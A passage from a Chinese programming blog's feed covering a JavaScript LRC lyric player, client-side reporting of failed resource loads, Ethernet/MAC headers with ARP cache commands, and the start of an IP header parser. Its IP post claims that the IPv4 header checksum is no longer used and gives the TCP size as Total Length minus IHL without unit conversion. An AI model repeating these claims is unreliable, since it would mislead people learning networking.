class="title function_">toSecond</span>(lyric[<span class="number">0</span>]), lyric[<span class="number">1</span>]]).<span class="title function_">sort</span>(<span class="function">(<span class="params">lyric1, lyric2</span>) =&gt;</span> lyric1[<span class="number">0</span>] - lyric2[<span class="number">0</span>]).<span class="title function_">filter</span>(<span class="function"><span class="params">lyric</span> =&gt;</span> lyric[<span class="number">0</span>] &gt;= seek);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setInterval和setTimeout在浏览器窗口非激活的状态下会停止工作或者以极慢的速度工作</span></span><br><span class="line">    <span class="comment">// 可以使用 Web Worker 解决或者 requestAnimationFrame 解决[更新：经过测试窗口处于非激活状态下 requestAnimationFrame 也会停止工作]</span></span><br><span class="line">    <span class="comment">// [RAF replacements for setTimeout and setInterval](https://bl.ocks.org/joyrexus/7304146)</span></span><br><span class="line">    <span class="comment">// @see https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame</span></span><br><span class="line">    <span class="keyword">const</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (lyrics.<span class="property">length</span> === <span class="number">0</span>) <span class="keyword">return</span> <span class="built_in">clearInterval</span>(timer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// seek 之前的全部显示 </span></span><br><span class="line">        <span class="keyword">while</span> (lyrics.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; lyrics[<span class="number">0</span>][<span class="number">0</span>] &lt;= seek) <span class="title function_">print</span>(lyrics.<span class="title function_">shift</span>()[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        seek += (interval / <span class="number">1000</span>);</span><br><span class="line">    }, interval);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> timer;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><ul><li><input checked="" disabled="" type="checkbox"> 使用RAF模拟setInterval</li><li><input checked="" disabled="" type="checkbox"> 封装为对象，支持play、pause、resume、seek、reset等功能</li></ul><figure class="highlight js"><figcaption><span>lrc_player_class.js</span><a href="/downloads/code/lrc_player_class.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRCPlayer</span> {</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">{ lyrics, print = (lyric) =&gt; <span class="variable language_">console</span>.log(lyric), done = () =&gt; { }, interval = <span class="number">50</span> }</span>) {</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lyrics</span> = lyrics;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">print</span> = print;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">done</span> = done;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">interval</span> = interval;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">seek</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_timer</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&#x27;INIT&#x27;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 播放（支持seek）</span></span><br><span class="line">    <span class="title function_">play</span>(<span class="params">seek = <span class="string">&#x27;00:00:00&#x27;</span></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> === <span class="string">&#x27;PLAY&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> !== <span class="string">&#x27;PAUSE&#x27;</span>) {</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">seek</span> = <span class="title function_">toSecond</span>(seek);</span><br><span class="line">        }</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&#x27;PLAY&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> lyrics = <span class="variable language_">this</span>.<span class="property">lyrics</span>.<span class="title function_">map</span>(<span class="function"><span class="params">lyric</span> =&gt;</span> [<span class="title function_">toSecond</span>(lyric[<span class="number">0</span>]), lyric[<span class="number">1</span>]]).<span class="title function_">sort</span>(<span class="function">(<span class="params">lyric1, lyric2</span>) =&gt;</span> lyric1[<span class="number">0</span>] - lyric2[<span class="number">0</span>]).<span class="title function_">filter</span>(<span class="function"><span class="params">lyric</span> =&gt;</span> lyric[<span class="number">0</span>] &gt;= <span class="variable language_">this</span>.<span class="property">seek</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_timer</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">            <span class="keyword">if</span> (lyrics.<span class="property">length</span> === <span class="number">0</span>) {</span><br><span class="line">                <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">_timer</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">done</span>();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="comment">// seek 之前的全部显示</span></span><br><span class="line">            <span class="keyword">while</span> (lyrics.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; lyrics[<span class="number">0</span>][<span class="number">0</span>] &lt;= <span class="variable language_">this</span>.<span class="property">seek</span>) <span class="variable language_">this</span>.<span class="title function_">print</span>(lyrics.<span class="title function_">shift</span>()[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">seek</span> += (<span class="variable language_">this</span>.<span class="property">interval</span> / <span class="number">1000</span>);</span><br><span class="line">        }, <span class="variable language_">this</span>.<span class="property">interval</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 暂停</span></span><br><span class="line">    <span class="title function_">pause</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> === <span class="string">&#x27;PAUSE&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&#x27;PAUSE&#x27;</span>;</span><br><span class="line">        <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">_timer</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 继续播放</span></span><br><span class="line">    <span class="title function_">resume</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> === <span class="string">&#x27;PAUSE&#x27;</span>) <span class="variable language_">this</span>.<span class="title function_">play</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重新开始</span></span><br><span class="line">    <span class="title function_">reset</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">pause</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&#x27;INIT&#x27;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">play</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://bl.ocks.org/joyrexus/7304146">RAF replacements for setTimeout and setInterval</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame">requestAnimationFrame</a></li><li><a href="https://dev.opera.com/articles/better-performance-with-requestanimationframe/">Better Performance With requestAnimationFrame</a></li><li><a href="https://stackoverflow.com/a/16033979/4942848">How do browsers pause&#x2F;change Javascript when tab or window is not active?</a></li><li><a href="https://css-tricks.com/using-requestanimationframe/">Using requestAnimationFrame</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>页面损坏资源动态感知</title>
      <link href="/post/bad-resource-dynamic-perception.html"/>
      <url>/post/bad-resource-dynamic-perception.html</url>
      
        <content type="html"><![CDATA[<h2 id="页面损坏资源动态感知"><a href="#页面损坏资源动态感知" class="headerlink" title="页面损坏资源动态感知"></a>页面损坏资源动态感知</h2><p>网页中会存在某些资源加载失败的情况，如404。如果请求的是我们自己的资源服务器，当资源不存在时服务器端就能记录到。但如资源不在我们服务器或者资源在响应过程中被截断，我们就可以通过下面方法在客户端捕获到加载失败的资源然后上报。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> target = e.<span class="property">target</span>;</span><br><span class="line">    <span class="keyword">if</span> (target.<span class="property">tagName</span> === <span class="string">&#x27;IMG&#x27;</span> &amp;&amp; -<span class="number">1</span> !== target.<span class="property">src</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;bad-resource.example.com/report&#x27;</span>)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上报</span></span><br><span class="line">    <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    img.<span class="property">src</span> = <span class="string">&#x27;http://bad-resource.example.com/report?tag=&#x27;</span> + target.<span class="property">tagName</span> + <span class="string">&#x27;&amp;href=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(target.<span class="property">src</span> || target.<span class="property">href</span>);</span><br><span class="line">    img.<span class="property">width</span> = <span class="number">0</span>;</span><br><span class="line">    img.<span class="property">height</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(img);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>除了捕获加载失败的资源，我们还可以捕获页面加载了哪些资源。例如检查页面有没有被注入脚本。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;document-load: &#x27;</span>, e.<span class="property">target</span>.<span class="property">tagName</span>, e.<span class="property">target</span>.<span class="property">src</span> || e.<span class="property">target</span>.<span class="property">href</span>);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><blockquote><p>对于页面被注入恶意脚本这种情况，我们使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">Content Security Policy</a>添加资源加载白名单更方便。下图为微信使用的内容安全策略：<br><img src="/images/wechat-content-security-policy.png" alt="微信 Content Security Policy"></p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener">EventTarget.addEventListener()</a></li><li><a href="https://stackoverflow.com/a/38517365/4942848">window.onload vs document.onload</a></li><li><a href="http://hax.iteye.com/blog/162718">addEventListener的第三個參數</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">内容安全策略( CSP )</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> addEventListener </tag>
            
            <tag> useCapture </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MAC协议</title>
      <link href="/post/mac-protocol.html"/>
      <url>/post/mac-protocol.html</url>
      
        <content type="html"><![CDATA[<h2 id="MAC协议"><a href="#MAC协议" class="headerlink" title="MAC协议"></a>MAC协议</h2><p><img src="/images/ip-mac.png"></p><ul><li>MAC 头部（用于以太网协议）</li><li>IP 头部（用于 IP 协议）</li></ul><p>首先，发送方将包的目的地，也就是要访问的服务器的 IP 地址写入 IP 头部中。这样一来，我们就知道这个包应该发往哪里，IP 协议就可以根据这一地址查找包的传输方向，从而找到下一个路由器的位置，也就是图中的路由器 R1。接下来，IP 协议会<strong>委托</strong>以太网协议将包传输过去。这时，IP 协议会查找下一个路由器的以太网地址（MAC 地址），并将这个地址写入 MAC 头部中。这样一来，以太网协议就知道要将这个包发到哪一个路由器上了。路由器中有一张 IP 协议的表，可根据这张表以及 IP 头部中记录的目的地信息查出接下来应该发往哪个路由器。为了将包发到下一个路由器，我们还需要查出下一个路由器的 MAC 地址，并记录到 MAC 头部中，大家可以理解为改写了 MAC 头部。这样，网络包就又被发往下一个节点了。</p><h3 id="MAC（Medium-Access-Control）协议"><a href="#MAC（Medium-Access-Control）协议" class="headerlink" title="MAC（Medium Access Control）协议"></a>MAC（Medium Access Control）协议</h3><p>MAC 地址是在网卡生产时写入 ROM 里的，只要将这个值读取出来写入 MAC 头部就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          Destination          |</span><br><span class="line">+-                             -+</span><br><span class="line">|            Ethernet           |</span><br><span class="line">+-                             -+</span><br><span class="line">|            Address            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|             Source            |</span><br><span class="line">+-                             -+</span><br><span class="line">|            Ethernet           |</span><br><span class="line">+-                             -+</span><br><span class="line">|            Address            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Ethernet Type         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|             IPv6              |</span><br><span class="line">+-                             -+</span><br><span class="line">|            header             |</span><br><span class="line">+-                             -+</span><br><span class="line">|             and               |</span><br><span class="line">+-                             -+</span><br><span class="line">/            payload ...        /</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>Destination Ethernet Address: 48 bits</p><p>  接收方 MAC 地址</p></li><li><p>Source Ethernet Address: 48 bits</p><p>  发送方 MAC 地址</p></li><li><p>Ethernet Type: 16 bits</p><p>  以太网类型。下面是一些常见的类型，一般在 TCP&#x2F;IP 通信中只使用 0800 和 0806 这两种。</p><ul><li>0000-05DC：IEEE 802.3</li><li>0800　　　：IP 协议</li><li>0806　　　：ARP 协议</li><li>86DD 　  ：　IPv6</li></ul></li></ul><figure class="highlight js"><figcaption><span>parse_mac.js</span><a href="/downloads/code/parse_mac.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseMAC</span>(<span class="params">mac</span>) {</span><br><span class="line">    <span class="keyword">let</span> _readerIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> srcMac = [], dstMac = [], type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> pos = <span class="number">0</span>; pos &lt; <span class="number">6</span>; pos ++) dstMac.<span class="title function_">push</span>(mac.<span class="title function_">readUInt8</span>(_readerIndex++));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> pos = <span class="number">0</span>; pos &lt; <span class="number">6</span>; pos ++) srcMac.<span class="title function_">push</span>(mac.<span class="title function_">readUInt8</span>(_readerIndex++));</span><br><span class="line"></span><br><span class="line">    type = mac.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        <span class="attr">srcMac</span>: srcMac.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">join</span>(<span class="string">&#x27;:&#x27;</span>),</span><br><span class="line">        <span class="attr">dstMac</span>: dstMac.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">join</span>(<span class="string">&#x27;:&#x27;</span>),</span><br><span class="line">        <span class="attr">type</span>: type.<span class="title function_">toString</span>(<span class="number">16</span>)</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">parseMAC</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;01005e7ffffa507b9d0bd1f40800&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>)));</span><br></pre></td></tr></table></figure><h3 id="ARP（Address-Resolution-Protocol）"><a href="#ARP（Address-Resolution-Protocol）" class="headerlink" title="ARP（Address Resolution Protocol）"></a>ARP（Address Resolution Protocol）</h3><p><img src="/images/arp.png"></p><ul><li><p>查看所有缓存</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp -a</span> </span><br><span class="line">bogon (10.0.1.1) at c:51:1:e2:ab:64 on en0 ifscope [ethernet]</span><br><span class="line">bogon (10.0.1.5) at 68:ef:43:2c:7b:7e on en0 ifscope [ethernet]</span><br><span class="line">bogon (10.0.1.15) at 70:1c:e7:47:ef:50 on en0 ifscope [ethernet]</span><br><span class="line">localhost (10.0.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>查询指定网络接口的缓存</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp -i en0 -a</span></span><br><span class="line">bogon (10.0.1.1) at c:51:1:e2:ab:64 on en0 ifscope [ethernet]</span><br><span class="line">bogon (10.0.1.15) at 70:1c:e7:47:ef:50 on en0 ifscope [ethernet]</span><br><span class="line">localhost (10.0.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]</span><br><span class="line">? (224.0.0.251) at 1:0:5e:0:0:fb on en0 ifscope permanent [ethernet]</span><br><span class="line">? (239.255.255.250) at 1:0:5e:7f:ff:fa on en0 ifscope permanent [ethernet]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>查询指定主机的arp条目</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp -a 172.16.0.108</span></span><br></pre></td></tr></table></figure></li><li><p>删除指定主机的arp条目</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> arp -d 10.0.1.8</span></span><br><span class="line">10.0.1.8 (10.0.1.8) deleted</span><br></pre></td></tr></table></figure></li><li><p>设置指定主机与MAC地址的映射</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp -s 172.16.0.108 00:50:56:82:52:2c</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://tools.ietf.org/html/rfc793#section-3.1">TRANSMISSION CONTROL PROTOCOL</a></li><li><a href="https://book.douban.com/subject/26941639/">网络是怎么连接的</a></li><li><a href="https://book.douban.com/subject/1088054/">TCP&#x2F;IP详解 卷1：协议</a></li><li><a href="https://book.douban.com/subject/1683696/">TCP&#x2F;IP网络与协议（第二版）</a></li><li><a href="https://www.zhihu.com/question/21524257">为什么标准以太网接口缺省的MTU为1500？</a></li><li><a href="https://community.emc.com/message/842879#842879">细说TCP确认机制</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> tcp </tag>
            
            <tag> ip </tag>
            
            <tag> mac </tag>
            
            <tag> arp </tag>
            
            <tag> icmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP协议</title>
      <link href="/post/ip-protocol.html"/>
      <url>/post/ip-protocol.html</url>
      
        <content type="html"><![CDATA[<h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><blockquote><p>IP 全称 INTERNET PROTOCOL</p></blockquote><p><img src="/images/tcp-ip-mac.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>Version:  4 bits</p><p>  版本号，目前使用的是4。</p></li><li><p>IHL:  4 bits</p><p>  IP 头部的长度。可选字段可导致头部长度变化，因此这里需要指定头部的长度。不是字节数，是32位的个数。头长度为<code>IHL * 32 bits or IHL * 4 bytes</code>。</p></li><li><p>Type of Service:  8 bits</p><p>  表示包传输优先级。</p></li><li><p>Total Length:  16 bits</p><p>  表示 IP 消息的总长度（最大65535 bytes）。TCP包的大小就是（Total Length - IHL）。</p></li><li><p>Identification:  16 bits</p><p>  用于识别包的编号，一般为包的序列号。如果一个包被 IP 分片，则所有分片都拥有相同的 ID。</p></li><li><p>Flags:  3 bits</p><p>  该字段有 3 个比特，其中 2 个比特有效，分别代表是否允许分片，以及当前包是否为分片包。</p></li><li><p>Fragment Offset:  13 bits</p><p>  表示当前包的内容为整个 IP 消息的第几个字节开始的内容。</p></li><li><p>Time to Live:  8 bits</p><p>  表示包的生存时间，这是为了避免网络出现回环时一个包永远在网络中打转。每经过一个路由器，这个值就会减 1，减到 0 时这个包就会被丢弃。一般会设置为<em>64</em>或者128。</p></li><li><p>Protocol:  8 bits</p><p>  协议号表示协议的类型（以下均为十六进制）</p><ul><li>TCP: 06</li><li>UDP: 11</li><li>ICMP: 01</li></ul></li><li><p>Header Checksum:  16 bits</p><p>  用于检查错误，现在已不使用。</p></li><li><p>Source Address:  32 bits</p><p>  网络包发送方的 IP 地址。 TODO 根据路由表查询</p></li><li><p>Destination Address:  32 bits</p><p>  网络包接收方的 IP 地址。</p></li><li><p>Options:  variable</p><p>  除了上面的头部字段之外，还可以添加可选字段用于记录其他控制信息，但可选字段很少使用。</p></li></ul><figure class="highlight js"><figcaption><span>parse_ip.js</span><a href="/downloads/code/parse_ip.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseIP</span>(<span class="params">ip</span>) {</span><br><span class="line">    <span class="keyword">let</span> _readerIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> version, ihl, type, len, id, flags, offset, ttl, protocol, checksum, source = [], dest = [], options;</span><br><span class="line"></span><br><span class="line">    version = ip.<span class="title function_">readUInt8</span>(_readerIndex) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    ihl = ip.<span class="title function_">readUInt8</span>(_readerIndex) &amp; <span class="number">0x0f</span>;</span><br><span class="line">    _readerIndex++;</span><br><span class="line"></span><br><span class="line">    type = ip.<span class="title function_">readUInt8</span>(_readerIndex);</span><br><span class="line">    _readerIndex++;</span><br><span class="line"></span><br><span class="line">    len = ip.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    id = ip.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    flags = ip.<span class="title function_">readUInt16BE</span>(_readerIndex) &gt;&gt; <span class="number">13</span>;</span><br><span class="line">    offset = ip.<span class="title function_">readUInt16BE</span>(_readerIndex) &amp; <span class="number">0x1fff</span>;</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    ttl = ip.<span class="title function_">readUInt8</span>(_readerIndex);</span><br><span class="line">    _readerIndex++;</span><br><span class="line"></span><br><span class="line">    protocol = ip.<span class="title function_">readUInt8</span>(_readerIndex);</span><br><span class="line">    